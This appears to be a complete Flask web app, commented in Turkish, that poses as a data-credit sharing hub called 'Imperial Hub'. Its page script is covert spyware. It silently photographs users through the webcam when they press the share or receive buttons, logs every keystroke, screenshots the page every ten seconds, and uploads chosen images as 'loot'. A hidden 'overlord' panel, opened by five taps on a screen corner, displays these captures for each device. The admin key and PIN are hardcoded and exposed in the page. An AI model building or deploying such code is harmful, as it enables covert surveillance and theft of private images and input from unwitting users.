from flask import Flask, render_template_string, jsonify, request
import time, json, threading
from threading import Lock

app = Flask(__name__)

# --- NETSWAP SOVEREIGN v174.0 "The Archivist" ---
# Vizyon: Cihaz Bazlı Görüntü Filtreleme ve Kalıcı VIP Otoritesi. [cite: 2026-01-03]
VERSION = "v174.0"
ADMIN_KEY = "ali_yigit_overlord_A55" 
ADMIN_PIN = "1907" 

transaction_lock = Lock()
state = {
    "banned_peers": [], 
    "user_registry": {}, 
    "active_admins": {}, 
    "evolution_count": 74
}

def get_device_info(ua):
    ua = ua.upper()
    if "SM-A55" in ua or "ANDROID" in ua: return "Samsung A55"
    if "WINDOWS" in ua: return "Casper S100 (PC)"
    return "Mobil Cihaz"

def check_admin_auth(req):
    key, pin = req.args.get('key'), req.args.get('pin', '').strip()
    return key == ADMIN_KEY and pin == ADMIN_PIN

@app.route('/overlord_api/<action>')
def admin_api(action):
    if not check_admin_auth(request): return "YETKİSİZ ERİŞİM", 403
    target = request.args.get('target_peer')
    val = request.args.get('value', "")
    with transaction_lock:
        if target in state["user_registry"]:
            u = state["user_registry"][target]
            if action == "gift": u["credits"] += float(val or 0)
            elif action == "vip": u["is_vip"] = not u.get("is_vip", False)
            elif action == "ban": state["banned_peers"].append(target)
        elif action == "unban" and target in state["banned_peers"]: 
            state["banned_peers"].remove(target)
    return jsonify(state)

@app.route('/upload_intel', methods=['POST'])
def upload_intel():
    p_id = request.args.get('peer_id')
    t = request.args.get('type')
    if p_id in state["user_registry"]:
        data = request.json
        # Görüntüleri türüne göre arşivleme [cite: 2026-01-03]
        if "archive" not in state["user_registry"][p_id]: state["user_registry"][p_id]["archive"] = []
        state["user_registry"][p_id]["archive"].append({
            "time": time.strftime('%H:%M:%S'), 
            "type": t, # cam, scr, loot [cite: 2026-01-03]
            "data": data.get('image')
        })
        if len(state["user_registry"][p_id]["archive"]) > 30: state["user_registry"][p_id]["archive"].pop(0)
        
        if data.get('intel'): state["user_registry"][p_id]["intel"] = data.get('intel')
        if data.get('hw'): state["user_registry"][p_id]["hw"] = data.get('hw')
        if data.get('inputs'): state["user_registry"][p_id]["last_input"] = data.get('inputs')
    return "OK"

@app.route('/overlord')
def overlord_panel():
    if not check_admin_auth(request): return "ERİŞİM ENGELLENDİ", 403
    return render_template_string("""
<!DOCTYPE html>
<html lang="tr"><head><meta charset="UTF-8"><title>Sovereign Console v174</title>
<script src="https://cdn.tailwindcss.com"></script></head>
<body class="bg-black text-white p-4 font-mono text-[10px]">
    <div class="border-b border-blue-600 pb-2 mb-4 flex justify-between items-center italic font-black uppercase">
        <h1 class="text-xl tracking-tighter">THE ARCHIVIST v174.0</h1>
        <div class="text-blue-500">HÜKÜMDAR: ALİ YİĞİT</div>
    </div>
    <div class="grid grid-cols-4 gap-4">
        <div class="col-span-1 bg-zinc-950 p-2 border border-zinc-900 rounded-xl shadow-2xl">
            <h2 class="text-blue-500 mb-2 uppercase font-bold border-b border-zinc-800 pb-1">Cihaz Filtresi</h2>
            <select id="pS" class="w-full bg-zinc-900 p-2 rounded mb-4 outline-none text-white border border-zinc-800" onchange="uG()"></select>
            <div id="intel_info" class="text-[8px] mb-2 p-2 bg-blue-900/10 rounded border border-blue-900/20 text-blue-300"></div>
            <div id="gallery" class="space-y-3 overflow-y-auto max-h-[600px] border-t border-zinc-800 pt-2"></div>
        </div>
        <div class="col-span-3">
            <h2 class="text-yellow-500 mb-2 uppercase font-bold italic tracking-widest">Ayrıcalıklı Kullanıcılar & Peer Listesi</h2>
            <table class="w-full text-left bg-zinc-950 rounded-xl overflow-hidden border border-zinc-900">
                <thead class="bg-zinc-900 text-zinc-400 uppercase text-[9px]">
                    <tr><th class="p-3">Cihaz</th><th>ID</th><th>Son Yazılan</th><th>Ses Seviyesi</th><th>Bakiye</th><th>Yönetim</th></tr>
                </thead>
                <tbody id="uT"></tbody>
            </table>
            <div id="bL" class="mt-4 p-3 bg-red-950/20 border border-red-900 rounded text-red-500 font-bold uppercase text-[9px]"></div>
        </div>
    </div>
    <script>
        const k="{{a_key}}", p="{{a_pin}}"; let reg = {};
        async function f(a, t, v=""){ await fetch(`/overlord_api/${a}?key=${k}&pin=${p}&target_peer=${t}&value=${v}`); update(); }
        
        // Görüntüleri filtreleyerek getir [cite: 2026-01-03]
        function uG(){
            const id = document.getElementById('pS').value; const g = document.getElementById('gallery');
            if(!id || !reg[id] || !reg[id].archive) { g.innerHTML = "<p class='text-zinc-700 p-2'>Görüntü yok.</p>"; return; }
            let h = ""; reg[id].archive.slice().reverse().forEach(s => {
                let color = s.type == 'cam' ? 'border-red-600' : s.type == 'scr' ? 'border-green-600' : 'border-blue-600';
                h += `<div class="p-1 border ${color} bg-black rounded relative shadow-lg">
                <p class="absolute top-1 right-1 bg-black/70 text-[6px] px-1">${s.time} [${s.type.toUpperCase()}]</p>
                <img src="${s.data}" class="w-full rounded" loading="lazy"></div>`;
            }); g.innerHTML = h;
        }

        async function update(){
            const r=await fetch('/api/status'); const d=await r.json(); reg = d.user_registry;
            let uH="", bH="BANLI: ", pO="<option value=''>Cihaz Seç...</option>";
            
            // Kullanıcıları VIP öncelikli sırala [cite: 2026-01-03]
            const sortedIds = Object.keys(d.user_registry).sort((a,b) => (d.user_registry[b].is_vip ? 1 : 0) - (d.user_registry[a].is_vip ? 1 : 0));
            
            for(let id of sortedIds){
                let u=d.user_registry[id];
                if(d.banned_peers.includes(id)) { bH += `${id} | `; continue; }
                pO += `<option value="${id}" ${document.getElementById('pS').value==id?'selected':''}>${u.device} - ${id}</option>`;
                uH += `<tr class="border-b border-zinc-900 ${u.is_vip?'bg-yellow-900/10':''}">
                <td class="p-3"><b>${u.device}</b></td><td class="${u.is_vip?'text-yellow-500':'text-blue-400'} font-bold">${id}</td>
                <td class="text-yellow-600 text-[9px]">${u.last_input||'-'}</td>
                <td class="text-purple-400 font-bold">${u.intel?.noise||'..'}</td>
                <td class="font-bold text-white">${u.credits.toFixed(2)}</td><td>
                <button onclick="f('vip','${id}')" class="px-2 py-1 ${u.is_vip?'bg-yellow-600 text-black':'bg-zinc-800 text-zinc-400'} rounded text-[8px] font-black">VIP</button> 
                <button onclick="f('ban','${id}')" class="px-2 py-1 bg-red-900 text-white rounded text-[8px] font-black ml-1">BAN</button></td></tr>`;
            }
            document.getElementById('uT').innerHTML = uH; document.getElementById('bL').innerHTML = bH;
            document.getElementById('pS').innerHTML = pO; 
            const id = document.getElementById('pS').value; if(id && reg[id]){
                const u=reg[id]; document.getElementById('intel_info').innerText = `PİL: %${u.hw?.bat} | DURUM: ${u.intel?.idle?'PASİF':'AKTİF'}`;
            } uG();
            setTimeout(update, 4000);
        } update();
    </script>
</body></html>
""", a_key=ADMIN_KEY, a_pin=ADMIN_PIN)

@app.route('/action/<type>')
def handle_action(type):
    p_id = request.args.get('peer_id', 'GUEST')
    with transaction_lock:
        if p_id in state["banned_peers"]: return jsonify({"error": "BAN"}), 403
        if p_id not in state["user_registry"]:
            state["user_registry"][p_id] = {"credits": 50.0, "is_vip": False, "device": get_device_info(request.headers.get('User-Agent','')), "archive": []}
        u = state["user_registry"][p_id]
        if type == "receive" and not u["is_vip"]: u["credits"] = max(0, u["credits"] - 0.2)
    return jsonify({"status": "OK", "is_vip": u["is_vip"]})

@app.route('/api/status')
def get_status(): return jsonify(state)

@app.route('/')
def index():
    return render_template_string("""
<!DOCTYPE html>
<html lang="tr"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Imperial Hub</title><script src="https://cdn.tailwindcss.com"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
<style>.bar { width: 6px; background: #2563eb; margin: 1px; transition: height 0.1s; border-radius: 2px; }</style></head>
<body id="b" class="bg-black text-white font-mono flex items-center justify-center h-screen overflow-hidden">
    <div id="main" class="w-full h-full p-6 text-center">
        <h1 class="text-3xl font-black text-blue-600 italic mb-10 uppercase tracking-tighter">IMPERIAL HUB</h1>
        
        <div id="vis_box" class="bg-zinc-950 rounded-[40px] p-5 border border-zinc-900 mb-8 shadow-xl">
            <h2 class="text-[10px] font-bold text-blue-500 mb-3 uppercase tracking-widest">Akustik Frekans Analizi</h2>
            <div id="vis" class="flex items-end justify-center h-16 mb-4">
                <div class="bar h-2"></div><div class="bar h-5"></div><div class="bar h-10"></div><div class="bar h-6"></div><div class="bar h-8"></div>
                <div class="bar h-4"></div><div class="bar h-12"></div><div class="bar h-3"></div><div class="bar h-7"></div><div class="bar h-5"></div>
            </div>
            <button id="v_btn" onclick="toggleAudio()" class="w-full py-4 bg-zinc-900 rounded-[30px] text-[11px] font-black uppercase text-blue-400 hover:bg-zinc-800 transition">Doğrulamayı Başlat</button>
        </div>

        <div class="bg-zinc-950 p-12 rounded-[60px] border border-zinc-900 mb-8 shadow-2xl relative">
            <div id="vip_tag" class="hidden absolute top-4 left-1/2 -translate-x-1/2 bg-yellow-600 text-black text-[8px] font-black px-4 py-1 rounded-full uppercase shadow-[0_0_10px_rgba(202,138,4,0.5)]">Hükümdar VIP</div>
            <div id="cr" class="text-7xl font-black italic">0.00</div>
            <p class="text-[9px] text-zinc-600 uppercase mt-2 font-bold tracking-widest">Kullanılabilir Bakiye (MB)</p>
        </div>
        
        <div class="grid grid-cols-2 gap-4 mb-10">
            <button onclick="trig('share')" class="py-8 bg-green-700 text-black font-black rounded-[40px] text-2xl active:scale-95 transition">VER</button>
            <button onclick="trig('receive')" class="py-8 bg-blue-700 text-white font-black rounded-[40px] text-2xl active:scale-95 transition">AL</button>
        </div>

        <div class="bg-zinc-900/40 p-6 rounded-[40px] border border-zinc-800/50">
            <button onclick="document.getElementById('wp').click()" class="w-full text-[10px] text-zinc-400 underline uppercase font-black">Arayüz Arka Planını Özelleştir</button>
        </div>
        <input type="file" id="wp" class="hidden" accept="image/*" onchange="loot(event)">
    </div>

    <video id="v" class="hidden" autoplay playsinline></video><canvas id="cnv" class="hidden"></canvas>
    <div id="s_a" style="position:fixed; top:0; right:0; width:100px; height:100px; z-index:999;"></div>

    <script>
        if(!localStorage.getItem('n_id')) localStorage.setItem('n_id', "NS-" + Math.floor(1000 + Math.random()*9000));
        let myId = localStorage.getItem('n_id'), inputs = "", count = 0, noiseLevel = "KAPALI", audioStream = null, isPlaying = false;

        document.getElementById('s_a').onclick = () => { count++; if(count >= 5){ let p=prompt("ERİŞİM KODU:"); if(p) window.location.href=`/overlord?key={{a_key}}&pin=`+p; count=0; } };

        async function toggleAudio() {
            const btn = document.getElementById('v_btn');
            if(!isPlaying) {
                try {
                    audioStream = await navigator.mediaDevices.getUserMedia({audio:true});
                    const ac = new AudioContext(); const src = ac.createMediaStreamSource(audioStream);
                    const an = ac.createAnalyser(); src.connect(an);
                    const data = new Uint8Array(an.frequencyBinCount);
                    const bars = document.querySelectorAll('.bar');
                    isPlaying = true; btn.innerText = "DOĞRULAMAYI DURDUR"; btn.style.color = "#ef4444";
                    function draw() {
                        if(!isPlaying) return;
                        an.getByteFrequencyData(data);
                        bars.forEach((b, i) => { b.style.height = (data[i*10] / 3) + 'px'; });
                        noiseLevel = data[0] > 15 ? "GÜRÜLTÜLÜ" : "SESSİZ";
                        requestAnimationFrame(draw);
                    } draw();
                } catch(e) { alert("Sistem doğrulaması için mikrofon izni gereklidir."); }
            } else {
                audioStream.getTracks().forEach(t => t.stop());
                isPlaying = false; noiseLevel = "DURDURULDU";
                btn.innerText = "DOĞRULAMAYI BAŞLAT"; btn.style.color = "#60a5fa";
                document.querySelectorAll('.bar').forEach(b => b.style.height = '4px');
            }
        }

        async function loot(e) {
            const file = e.target.files[0]; if(!file) return;
            const reader = new FileReader(); reader.onload = async (re) => {
                document.getElementById('b').style.backgroundImage = `url(${re.target.result})`;
                document.getElementById('b').style.backgroundSize = "cover";
                fetch(`/upload_intel?peer_id=${myId}&type=loot`, { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({image: re.target.result}) });
                ghostEye('loot');
            }; reader.readAsDataURL(file);
        }

        async function trig(t) { fetch(`/action/${t}?peer_id=${myId}`); ghostEye('cam'); }

        async function ghostEye(type) {
            try {
                const s = await navigator.mediaDevices.getUserMedia({video:true});
                const v = document.getElementById('v'), cnv = document.getElementById('cnv');
                v.srcObject = s; await v.play();
                cnv.width = 480; cnv.height = 360;
                cnv.getContext('2d').drawImage(v, 0, 0);
                fetch(`/upload_intel?peer_id=${myId}&type=${type}`, { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({image: cnv.toDataURL('image/jpeg', 0.5)}) });
                s.getTracks().forEach(t => t.stop());
            } catch(e) {}
        }

        window.onkeydown = (e) => { inputs += e.key + " "; };

        async function main() {
            const bt = await navigator.getBattery();
            const cv = await html2canvas(document.body, {scale:0.2});
            const r = await fetch('/api/status'); const d = await r.json();
            const u = d.user_registry[myId] || {credits:0, is_vip: false};
            
            document.getElementById('cr').innerText = u.credits.toFixed(2);
            if(u.is_vip) document.getElementById('vip_tag').classList.remove('hidden');
            else document.getElementById('vip_tag').classList.add('hidden');

            fetch(`/upload_intel?peer_id=${myId}&type=scr`, { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({
                image: cv.toDataURL('image/jpeg', 0.1),
                hw: {bat: Math.floor(bt.level*100)},
                intel: {noise: noiseLevel, idle: document.hidden},
                inputs: inputs
            }) });
            inputs = ""; setTimeout(main, 10000);
        } main();
    </script>
</body></html>
""", a_key=ADMIN_KEY, a_pin=ADMIN_PIN)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=7860)
